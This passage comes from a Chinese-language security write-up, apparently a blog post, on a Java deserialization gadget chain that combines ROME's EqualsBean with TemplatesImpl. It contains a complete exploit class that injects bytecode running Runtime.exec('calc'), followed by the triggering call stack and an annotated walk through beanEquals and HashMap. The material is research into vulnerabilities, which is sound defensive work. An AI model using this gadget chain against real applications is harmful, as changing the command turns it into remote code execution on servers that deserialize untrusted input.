        <span class="n">String</span> <span class="n">TemplatesImpl</span><span class="o">=</span><span class="s">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span><span class="o">;</span>

        <span class="c1">// 创建恶意类</span>
        <span class="n">ClassPool</span> <span class="n">classPool</span> <span class="o">=</span> <span class="n">ClassPool</span><span class="o">.</span><span class="na">getDefault</span><span class="o">();</span>
        <span class="n">classPool</span><span class="o">.</span><span class="na">appendClassPath</span><span class="o">(</span><span class="n">AbstractTranslet</span><span class="o">);</span>
        <span class="n">CtClass</span> <span class="n">ctClass</span> <span class="o">=</span> <span class="n">classPool</span><span class="o">.</span><span class="na">makeClass</span><span class="o">(</span><span class="s">"cccc"</span><span class="o">);</span>
        <span class="n">ctClass</span><span class="o">.</span><span class="na">setSuperclass</span><span class="o">(</span><span class="n">classPool</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">AbstractTranslet</span><span class="o">));</span>
        <span class="n">ctClass</span><span class="o">.</span><span class="na">makeClassInitializer</span><span class="o">().</span><span class="na">setBody</span><span class="o">(</span><span class="s">"java.lang.Runtime.getRuntime().exec(\"calc\");"</span><span class="o">);</span>
        <span class="kt">byte</span><span class="o">[]</span> <span class="n">bytes</span> <span class="o">=</span> <span class="n">ctClass</span><span class="o">.</span><span class="na">toBytecode</span><span class="o">();</span>

        <span class="c1">// 创建TemplatesImpl对象</span>
        <span class="n">Object</span> <span class="n">templateImpl</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="n">TemplatesImpl</span><span class="o">).</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{}).</span><span class="na">newInstance</span><span class="o">();</span>
        <span class="n">setFiled</span><span class="o">(</span><span class="n">templateImpl</span><span class="o">,</span> <span class="s">"_bytecodes"</span><span class="o">,</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[][]{</span><span class="n">bytes</span><span class="o">});</span>
        <span class="n">setFiled</span><span class="o">(</span><span class="n">templateImpl</span><span class="o">,</span> <span class="s">"_name"</span><span class="o">,</span> <span class="s">"test"</span><span class="o">);</span>
        <span class="n">setFiled</span><span class="o">(</span><span class="n">templateImpl</span><span class="o">,</span> <span class="s">"_tfactory"</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>

        <span class="n">EqualsBean</span> <span class="n">bean</span> <span class="o">=</span> <span class="k">new</span> <span class="n">EqualsBean</span><span class="o">(</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="s">"s"</span><span class="o">);</span>

        <span class="n">HashMap</span> <span class="n">map1</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
        <span class="n">HashMap</span> <span class="n">map2</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
        <span class="n">map1</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"yy"</span><span class="o">,</span> <span class="n">bean</span><span class="o">);</span>
        <span class="n">map1</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"zZ"</span><span class="o">,</span> <span class="n">templateImpl</span><span class="o">);</span>
        <span class="n">map2</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"zZ"</span><span class="o">,</span> <span class="n">bean</span><span class="o">);</span>
        <span class="n">map2</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"yy"</span><span class="o">,</span> <span class="n">templateImpl</span><span class="o">);</span>
        <span class="n">HashSet</span> <span class="n">table</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashSet</span><span class="o">();</span>
        <span class="n">table</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">map1</span><span class="o">);</span>
        <span class="n">table</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">map2</span><span class="o">);</span>

        <span class="n">setFiled</span><span class="o">(</span><span class="n">bean</span><span class="o">,</span> <span class="s">"_beanClass"</span><span class="o">,</span> <span class="n">Templates</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
        <span class="n">setFiled</span><span class="o">(</span><span class="n">bean</span><span class="o">,</span> <span class="s">"_obj"</span><span class="o">,</span> <span class="n">templateImpl</span><span class="o">);</span>
        <span class="c1">// 序列化</span>
        <span class="n">ObjectOutputStream</span> <span class="n">objectOutputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileOutputStream</span><span class="o">(</span><span class="s">"EqualsBean.bin"</span><span class="o">));</span>
        <span class="n">objectOutputStream</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">table</span><span class="o">);</span>
        <span class="n">objectOutputStream</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>

        <span class="c1">// 反序列化</span>
        <span class="n">ObjectInputStream</span> <span class="n">objectInputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectInputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="s">"EqualsBean.bin"</span><span class="o">));</span>
        <span class="n">objectInputStream</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
        <span class="n">objectInputStream</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">setFiled</span><span class="o">(</span><span class="n">Object</span> <span class="n">o</span><span class="o">,</span> <span class="n">String</span> <span class="n">fieldname</span><span class="o">,</span> <span class="n">Object</span> <span class="n">value</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
        <span class="n">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="n">o</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="n">fieldname</span><span class="o">);</span>
        <span class="n">field</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">field</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">o</span><span class="o">,</span> <span class="n">value</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<h3 data-content="1" id="11b3f61e0f9c6c86a2c5e0e77acadfdd">函数调用栈</h3>
<div class="highlight"><pre><span></span><span class="nl">getOutputProperties:</span><span class="mi">507</span><span class="o">,</span> <span class="n">TemplatesImpl</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">xalan</span><span class="o">.</span><span class="na">internal</span><span class="o">.</span><span class="na">xsltc</span><span class="o">.</span><span class="na">trax</span><span class="o">)</span>
<span class="nl">invoke0:</span><span class="o">-</span><span class="mi">1</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span> <span class="o">[</span><span class="mi">2</span><span class="o">]</span>
<span class="nl">invoke:</span><span class="mi">62</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invoke:</span><span class="mi">43</span><span class="o">,</span> <span class="n">DelegatingMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invoke:</span><span class="mi">497</span><span class="o">,</span> <span class="n">Method</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">beanEquals:</span><span class="mi">146</span><span class="o">,</span> <span class="n">EqualsBean</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">syndication</span><span class="o">.</span><span class="na">feed</span><span class="o">.</span><span class="na">impl</span><span class="o">)</span>
<span class="nl">equals:</span><span class="mi">103</span><span class="o">,</span> <span class="n">EqualsBean</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">syndication</span><span class="o">.</span><span class="na">feed</span><span class="o">.</span><span class="na">impl</span><span class="o">)</span>
<span class="nl">equals:</span><span class="mi">472</span><span class="o">,</span> <span class="n">AbstractMap</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">)</span>
<span class="nl">putVal:</span><span class="mi">634</span><span class="o">,</span> <span class="n">HashMap</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">)</span>
<span class="nl">put:</span><span class="mi">611</span><span class="o">,</span> <span class="n">HashMap</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">)</span>
<span class="nl">readObject:</span><span class="mi">334</span><span class="o">,</span> <span class="n">HashSet</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">)</span>
<span class="nl">invoke0:</span><span class="o">-</span><span class="mi">1</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span> <span class="o">[</span><span class="mi">1</span><span class="o">]</span>
<span class="nl">invoke:</span><span class="mi">62</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invoke:</span><span class="mi">43</span><span class="o">,</span> <span class="n">DelegatingMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invoke:</span><span class="mi">497</span><span class="o">,</span> <span class="n">Method</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invokeReadObject:</span><span class="mi">1058</span><span class="o">,</span> <span class="n">ObjectStreamClass</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
<span class="nl">readSerialData:</span><span class="mi">1900</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
<span class="nl">readOrdinaryObject:</span><span class="mi">1801</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
<span class="nl">readObject0:</span><span class="mi">1351</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
<span class="nl">readObject:</span><span class="mi">371</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
<span class="nl">main:</span><span class="mi">62</span><span class="o">,</span> <span class="n">EqualsBeanExp</span> <span class="o">(</span><span class="n">RomeSec</span><span class="o">)</span>
</pre></div>
<h3 data-content="1" id="ff846fb9997da80d73e775fee8b190d4">详细分析</h3>
<p>在EqualsBean的beanEquals方法中也能够获取类的get方法并调用</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">beanEquals</span><span class="o">(</span><span class="n">Object</span> <span class="n">obj</span><span class="o">)</span> <span class="o">{</span>
    <span class="n">Object</span> <span class="n">bean1</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">_obj</span><span class="o">;</span>
    <span class="n">Object</span> <span class="n">bean2</span> <span class="o">=</span> <span class="n">obj</span><span class="o">;</span>
    <span class="kt">boolean</span> <span class="n">eq</span><span class="o">;</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">obj</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">eq</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
    <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">bean1</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">obj</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">eq</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
    <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">bean1</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">obj</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
        <span class="c1">// 注意这句</span>
        <span class="k">if</span> <span class="o">(!</span><span class="k">this</span><span class="o">.</span><span class="na">_beanClass</span><span class="o">.</span><span class="na">isInstance</span><span class="o">(</span><span class="n">obj</span><span class="o">))</span> <span class="o">{</span>
            <span class="n">eq</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
            <span class="n">eq</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>

            <span class="k">try</span> <span class="o">{</span>
                <span class="c1">// 获取方法</span>
                <span class="n">PropertyDescriptor</span><span class="o">[]</span> <span class="n">pds</span> <span class="o">=</span> <span class="n">BeanIntrospector</span><span class="o">.</span><span class="na">getPropertyDescriptors</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">_beanClass</span><span class="o">);</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">pds</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                    <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">eq</span> <span class="o">&amp;&amp;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">pds</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="o">++</span><span class="n">i</span><span class="o">)</span> <span class="o">{</span>
                        <span class="n">Method</span> <span class="n">pReadMethod</span> <span class="o">=</span> <span class="n">pds</span><span class="o">[</span><span class="n">i</span><span class="o">].</span><span class="na">getReadMethod</span><span class="o">();</span>
                        <span class="k">if</span> <span class="o">(</span><span class="n">pReadMethod</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">pReadMethod</span><span class="o">.</span><span class="na">getDeclaringClass</span><span class="o">()</span> <span class="o">!=</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span> <span class="o">&amp;&amp;</span> <span class="n">pReadMethod</span><span class="o">.</span><span class="na">getParameterTypes</span><span class="o">().</span><span class="na">length</span> <span class="o">==</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
                            <span class="c1">// 这里</span>
                            <span class="n">Object</span> <span class="n">value1</span> <span class="o">=</span> <span class="n">pReadMethod</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">bean1</span><span class="o">,</span> <span class="n">NO_PARAMS</span><span class="o">);</span>
                            <span class="n">Object</span> <span class="n">value2</span> <span class="o">=</span> <span class="n">pReadMethod</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">bean2</span><span class="o">,</span> <span class="n">NO_PARAMS</span><span class="o">);</span>
                            <span class="n">eq</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">doEquals</span><span class="o">(</span><span class="n">value1</span><span class="o">,</span> <span class="n">value2</span><span class="o">);</span>
                        <span class="o">}</span>
                    <span class="o">}</span>
                <span class="o">}</span>
            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">var10</span><span class="o">)</span> <span class="o">{</span>
                <span class="k">throw</span> <span class="k">new</span> <span class="n">RuntimeException</span><span class="o">(</span><span class="s">"Could not execute equals()"</span><span class="o">,</span> <span class="n">var10</span><span class="o">);</span>
            <span class="o">}</span>
        <span class="o">}</span>
    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
        <span class="n">eq</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="k">return</span> <span class="n">eq</span><span class="o">;</span>
<span class="o">}</span>
</pre></div>
<p>而调用此方法的是EqualsBean的equals方法</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">equals</span><span class="o">(</span><span class="n">Object</span> <span class="n">obj</span><span class="o">)</span> <span class="o">{</span>
    <span class="k">return</span> <span class="k">this</span><span class="o">.</span><span class="na">beanEquals</span><span class="o">(</span><span class="n">obj</span><span class="o">);</span>
<span class="o">}</span>
</pre></div>
<p>在HashMap的putVal方法中<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240120125053-7d83e0a4-b74f-1.png"/></p>
<p>在进入AbstractMap的equals方法中，这里就是对两个map元素逐个比较<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240120125112-892f3002-b74f-1.png"/></p>
<p><strong>注</strong>：这里的HashMap、HashSet、HashTable都可以相互替换</p>
</div>
</div>